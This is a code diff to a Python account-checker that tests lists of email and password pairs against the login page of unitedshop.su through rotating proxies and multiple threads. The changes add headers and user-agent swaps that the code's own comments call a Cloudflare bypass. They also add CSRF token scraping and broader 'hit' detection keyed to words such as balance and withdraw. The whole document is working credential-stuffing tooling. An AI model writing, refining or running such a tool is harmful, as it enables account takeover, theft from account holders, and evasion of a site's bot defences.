@@ -5,10 +5,10 @@ import time
 import warnings
 import threading
 import shutil
+import re
 from queue import Queue
 from colorama import init, Fore, Style
 from user_agent import generate_user_agent
-from urllib.parse import urlparse
 
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
@@ -17,12 +17,8 @@ init(autoreset=True)
 UA_CONFIGS = [
     {'os': 'win', 'navigator': 'chrome'},
     {'os': 'win', 'navigator': 'firefox'},
-    {'os': 'win', 'navigator': 'ie'},
     {'os': 'mac', 'navigator': 'chrome'},
-    {'os': 'mac', 'navigator': 'firefox'},
     {'os': 'linux', 'navigator': 'chrome'},
-    {'os': 'linux', 'navigator': 'firefox'},
-    {'os': 'android', 'navigator': 'chrome'},
 ]
 
 def get_random_user_agent():
@@ -30,7 +26,7 @@ def get_random_user_agent():
         config = random.choice(UA_CONFIGS)
         return generate_user_agent(os=config['os'], navigator=config['navigator'])
     except:
-        return generate_user_agent()
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
 
 try:
     import socks
@@ -131,11 +127,6 @@ if not proxies:
     else:
         input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
         exit()
-else:
-    if not SOCKS_AVAILABLE:
-        has_socks = any(p.startswith(('socks4://', 'socks5://', 'socks5h://')) for p in proxies)
-        if has_socks:
-            print(f"{Fore.YELLOW}[!] Warning: SOCKS proxies detected but 'requests[socks]' not installed.\n")
 
 if use_proxies:
     threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
@@ -156,13 +147,15 @@ print_lock = threading.Lock()
 result_counter = 0
 
 def check_account(email, pwd, proxy_dict):
+    """Check Unitedshop account - FIX: Better Cloudflare bypass headers"""
     s = requests.Session()
     userA = get_random_user_agent()
     
     try:
+        # Enhanced headers for Cloudflare bypass
         headers = {
             "User-Agent": userA,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Accept-Language": "en-US,en;q=0.9",
             "Accept-Encoding": "gzip, deflate, br",
             "Connection": "keep-alive",
@@ -170,33 +163,88 @@ def check_account(email, pwd, proxy_dict):
             "Sec-Fetch-Dest": "document",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-Site": "none",
+            "Sec-Fetch-User": "?1",
+            "Cache-Control": "max-age=0",
+            "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
         }
         
-        s.get("https://unitedshop.su/login", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+        # First get the login page
+        r1 = s.get("https://unitedshop.su/login", headers=headers, proxies=proxy_dict, timeout=30, verify=False)
         
-        headers["Content-Type"] = "application/x-www-form-urlencoded"
-        headers["Origin"] = "https://unitedshop.su"
-        headers["Referer"] = "https://unitedshop.su/login"
-        headers["Sec-Fetch-Site"] = "same-origin"
+        # Check if blocked by Cloudflare
+        if r1.status_code == 403 or "cloudflare" in r1.text.lower():
+            # Try with different headers
+            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"
+            r1 = s.get("https://unitedshop.su/login", headers=headers, proxies=proxy_dict, timeout=30, verify=False)
+        
+        if r1.status_code == 403:
+            return "fail", "Cloudflare blocked"
+        
+        # Extract CSRF token if present
+        csrf_token = ""
+        csrf_match = re.search(r'name=["\']?csrf[_-]?token["\']?\s+value=["\']([^"\']+)["\']', r1.text, re.I)
+        if csrf_match:
+            csrf_token = csrf_match.group(1)
+        
+        # Also try other CSRF patterns
+        if not csrf_token:
+            csrf_match = re.search(r'<input[^>]+name=["\']?_token["\']?[^>]+value=["\']([^"\']+)["\']', r1.text, re.I)
+            if csrf_match:
+                csrf_token = csrf_match.group(1)
+        
+        # Update headers for POST
+        headers.update({
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://unitedshop.su",
+            "Referer": "https://unitedshop.su/login",
+            "Sec-Fetch-Site": "same-origin",
+        })
+        
+        # Build login data
+        login_data = {
+            "username": email,
+            "password": pwd,
+        }
+        if csrf_token:
+            login_data["_token"] = csrf_token
+            login_data["csrf_token"] = csrf_token
         
         r = s.post("https://unitedshop.su/login",
-                   data={"username": email, "password": pwd},
-                   headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
+                   data=login_data, headers=headers, proxies=proxy_dict, 
+                   timeout=30, verify=False, allow_redirects=True)
         
         txt = r.text.lower()
         url = r.url.lower()
         
-        if any(x in url for x in ["dashboard", "panel", "account"]) or any(x in txt for x in ["balance", "logout", "welcome"]):
+        # Success indicators
+        if any(x in url for x in ["dashboard", "panel", "account", "home"]) and "login" not in url:
             return "hit", "Valid"
-        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
+        if any(x in txt for x in ["balance", "logout", "welcome", "deposit", "withdraw"]):
+            return "hit", "Valid"
+        
+        # Failure indicators
+        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "failed"]):
             return "fail", "Invalid credentials"
+        
+        # Check if still on login page
+        if "login" in url:
+            if "username" in txt and "password" in txt:
+                return "fail", "Login failed"
+        
+        # Cloudflare check
+        if r.status_code == 403:
+            return "fail", "Cloudflare blocked"
+            
         return "fail", f"Status {r.status_code}"
+        
     except requests.exceptions.Timeout:
         return "error", "Timeout"
     except requests.exceptions.ProxyError:
         return "error", "Proxy error"
-    except:
-        return "error", "Request failed"
+    except Exception as e:
+        return "error", f"Error: {str(e)[:30]}"
 
 def worker(q):
     global result_counter, hit_counter, fail_counter
